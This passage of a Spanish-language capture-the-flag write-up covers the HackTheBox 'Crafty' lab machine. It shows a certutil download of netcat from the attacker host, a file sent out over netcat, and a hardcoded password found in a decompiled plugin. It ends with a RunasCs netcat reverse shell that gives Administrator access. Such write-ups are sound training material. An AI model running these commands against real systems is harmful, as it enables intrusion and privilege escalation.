</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.2] from (UNKNOWN) [10.10.11.249] 49681
</span></span></span><span class=line><span class=cl><span class=go>Microsoft Windows [Version 10.0.17763.5329]
</span></span></span><span class=line><span class=cl><span class=go>(c) 2018 Microsoft Corporation. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>c:\users\svc_minecraft\server&gt;whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>crafty\svc_minecraft
</span></span></span></code></pre></div><p>donde podemos ver la flag de usuario en el directorio <code>C:\Users\svc_minecraft\Desktop</code>.</p><hr><h3 id=nt-authoritysystem---administrador>NT Authority/System - Administrador
<a class=heading-link href=#nt-authoritysystem---administrador><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h3><ul><li>Luego de husmear por algunos archivos termino encontrando un archivo <code>Java</code> en el directorio <code>C:\Users\svc_minecraft\server\plugins</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>c:\Users\svc_minecraft\server\plugins&gt;dir
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>dir
</span></span></span><span class=line><span class=cl><span class=go> Volume in drive C has no label.
</span></span></span><span class=line><span class=cl><span class=go> Volume Serial Number is C419-63F6
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> Directory of c:\Users\svc_minecraft\server\plugins
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>10/27/2023  02:48 PM    &lt;DIR&gt;          .
</span></span></span><span class=line><span class=cl><span class=go>10/27/2023  02:48 PM    &lt;DIR&gt;          ..
</span></span></span><span class=line><span class=cl><span class=go>10/27/2023  02:48 PM             9,996 playercounter-1.0-SNAPSHOT.jar
</span></span></span><span class=line><span class=cl><span class=go>               1 File(s)          9,996 bytes
</span></span></span><span class=line><span class=cl><span class=go>               2 Dir(s)   3,814,014,976 bytes free
</span></span></span></code></pre></div><ul><li>Para descargar este archivo decido pasar un binario de <code>netcat</code> para <code>Windows</code> usando la herramienta <code>certutil</code>. Primero empezamos un servidor temporal <code>HTTP</code> en <code>Python</code> en el puerto <code>8080</code> en nuestra m√°quina de atacante:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ls &amp;&amp; python3 -m http.server 8080
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>log4j-shell-poc  nc64.exe  pyCraft
</span></span></span><span class=line><span class=cl><span class=go>Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
</span></span></span></code></pre></div><p>y en la m√°quina v√≠ctima, corremos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>c:\Users\svc_minecraft\server\plugins&gt;certutil.exe -urlcache -split -f http://10.10.16.2:8080/nc64.exe c:\Users\svc_minecraft\Downloads\nc.exe
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>certutil.exe -urlcache -split -f http://10.10.16.2:8080/nc64.exe c:\Users\svc_minecraft\Downloads\nc.exe
</span></span></span><span class=line><span class=cl><span class=go>****  Online  ****
</span></span></span><span class=line><span class=cl><span class=go>  0000  ...
</span></span></span><span class=line><span class=cl><span class=go>  b0d8
</span></span></span><span class=line><span class=cl><span class=go>CertUtil: -URLCache command completed successfully.
</span></span></span></code></pre></div><ul><li>Luego, usamos el binario de <code>netcat</code> para descargar el archivo <code>c:\Users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar</code>. En nuestra m√°quina de atacante empiezo un listener con <code>netcat</code> en el puerto <code>4444</code> y guardo todo lo recibido en un archivo:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 4444 &gt; playercounter-1.0-SNAPSHOT.jar
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 4444 ...
</span></span></span></code></pre></div><p>y en la m√°quina v√≠ctima paso el archivo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>c:\Users\svc_minecraft\server\plugins&gt;c:\Users\svc_minecraft\Downloads\nc.exe 10.10.16.2 4444 &lt; c:\Users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>c:\Users\svc_minecraft\Downloads\nc.exe 10.10.16.2 4444 &lt; c:\Users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar
</span></span></span></code></pre></div><p>Obtengo una conexi√≥n en mi m√°quina luego de correr el comando superior:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 4444 &gt; playercounter-1.0-SNAPSHOT.jar
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 4444 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.2] from (UNKNOWN) [10.10.11.249] 49684
</span></span></span></code></pre></div><p>donde luego de un tiempo presiono <code>Ctrl+C</code>.</p><ul><li>Finalmente, chequeo que los hashes <code>MD5</code> de ambos archivos sean el mismo para asegurar la integridad de √©stos (tanto el original en la m√°quina v√≠ctima como aquel que copi√© en mi m√°quina de atacante). En la m√°quina v√≠ctima (el archivo original) tenemos:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>c:\Users\svc_minecraft\server\plugins&gt;certutil.exe -hashfile c:\Users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar MD5
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>certutil.exe -hashfile c:\Users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar MD5
</span></span></span><span class=line><span class=cl><span class=go>MD5 hash of c:\Users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar:
</span></span></span><span class=line><span class=cl><span class=go>349f6584e18cd85fc9e014da154efe03
</span></span></span><span class=line><span class=cl><span class=go>CertUtil: -hashfile command completed successfully.
</span></span></span></code></pre></div><p>y en mi m√°quina de atacante por nuestra parte tenemos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ md5sum playercounter-1.0-SNAPSHOT.jar
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>349f6584e18cd85fc9e014da154efe03  playercounter-1.0-SNAPSHOT.jar
</span></span></span></code></pre></div><p>Dado que ambos hashes son el mismo entonces el archivo se ha transferido exitosamente.</p><ul><li>Ahora, analizo el archivo de <code>Java</code> <code>.jar</code> tratando de decompilarlo con la herramienta <code>Java Decompiler</code> (<code>jd-gui</code>). Al menos en Kali Linux, podemos instalarlo con:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>sudo apt install jd-gui
</span></span></span></code></pre></div><p>y lo corremos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ jd-gui &amp;&gt; /dev/null &amp; disown
</span></span></span></code></pre></div><ul><li>Abro el archivo <code>playercounter-1.0-SNAPSHOT.jar</code> con el decompilador. En √©l podemos ver una clase llamada <code>Playercounter.class</code>:</li></ul><p><img alt="Crafty 2" src=/pentesting/images/Crafty_2.png></p><p>o</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>htb.crafty.playercounter</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.IOException</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.PrintWriter</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>net.kronos.rkon.core.Rcon</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>net.kronos.rkon.core.ex.AuthenticationException</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.bukkit.plugin.java.JavaPlugin</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=kd>class</span> <span class=nc>Playercounter</span><span class=w> </span><span class=kd>extends</span><span class=w> </span><span class=n>JavaPlugin</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>onEnable</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>Rcon</span><span class=w> </span><span class=n>rcon</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>rcon</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Rcon</span><span class=p>(</span><span class=s>&#34;127.0.0.1&#34;</span><span class=p>,</span><span class=w> </span><span class=n>27015</span><span class=p>,</span><span class=w> </span><span class=s>&#34;s67u84zKq8IXw&#34;</span><span class=p>.</span><span class=na>getBytes</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>IOException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>RuntimeException</span><span class=p>(</span><span class=n>e</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>AuthenticationException</span><span class=w> </span><span class=n>e2</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>RuntimeException</span><span class=p>(</span><span class=n>e2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>String</span><span class=w> </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>rcon</span><span class=p>.</span><span class=na>command</span><span class=p>(</span><span class=s>&#34;players online count&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>PrintWriter</span><span class=w> </span><span class=n>writer</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>PrintWriter</span><span class=p>(</span><span class=s>&#34;C:\\inetpub\\wwwroot\\playercount.txt&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;UTF-8&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>writer</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=n>result</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>IOException</span><span class=w> </span><span class=n>e3</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>RuntimeException</span><span class=p>(</span><span class=n>e3</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>onDisable</span><span class=p>()</span><span class=w> </span><span class=p>{}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p>donde puedo ver algo como una credencial/contrase√±a: <code>s67u84zKq8IXw</code></p><ul><li>¬øQu√© tal si esta fuera la contrase√±a del usuario <code>Administrator</code>? Revisando los usuarios existentes en la m√°quina v√≠ctima, veo que existen 2 (fuera de <code>svc_minecraft</code>): <code>jacob</code> y <code>Administrator</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>c:\Users\svc_minecraft\server\plugins&gt;net user
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>net user
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>User accounts for \\CRAFTY
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>-------------------------------------------------------------------------------
</span></span></span><span class=line><span class=cl><span class=go>Administrator            DefaultAccount           Guest
</span></span></span><span class=line><span class=cl><span class=go>jacob                    svc_minecraft            WDAGUtilityAccount
</span></span></span><span class=line><span class=cl><span class=go>The command completed successfully.
</span></span></span></code></pre></div><ul><li>Dado que no tenemos servicios como <code>Server Message Block</code> (<code>SMB</code>) o <code>Windows Remote Management</code> corriendo, usaremos la herramienta <code>RunasCs</code> para pivotear de usuario dentro de la m√°quina Windows. Lo descargamos desde <a href=https://github.com/antonioCoco/RunasCs/releases/tag/v1.5 class=external-link target=_blank rel=noopener>su repositorio de Github</a>, lo unzipeo y paso el archivo <code>.exe</code> a la m√°quina v√≠ctima de la misma manera a como anteriormente transferimos el binario de <code>netcat</code>. Luego, corro <code>RunasCs</code> como <code>Administrator</code> usando la credencial hallada en el archivo <code>.jar</code>. Empiezo un listener con <code>netcat</code> en el puerto <code>443</code> y en la m√°quina v√≠ctima corremos:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>c:\Users\svc_minecraft\server\plugins&gt;c:\Users\svc_minecraft\Downloads\runascs.exe Administrator s67u84zKq8IXw &#34;C:\Users\svc_minecraft\Downloads\nc.exe 10.10.16.2 443 -e C:\Windows\System32\cmd.exe&#34;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>c:\Users\svc_minecraft\Downloads\runascs.exe Administrator s67u84zKq8IXw &#34;C:\Users\svc_minecraft\Downloads\nc.exe 10.10.16.2 443 -e C:\Windows\System32\cmd.exe&#34;
</span></span></span></code></pre></div><p>y obtengo una shell como el usuario <code>Administrator</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rlwrap -cAr nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.2] from (UNKNOWN) [10.10.11.249] 49687
</span></span></span><span class=line><span class=cl><span class=go>Microsoft Windows [Version 10.0.17763.5329]
</span></span></span><span class=line><span class=cl><span class=go>(c) 2018 Microsoft Corporation. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Windows\system32&gt;whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>crafty\administrator
</span></span></span></code></pre></div><p>De manera que podemos leer la flag <code>root.txt</code> en el directorio <code>C:\Users\Administrator\Desktop</code> y m√°quina resuelta.</p><p>~ Happy Hacking</p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Desarrollado por <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>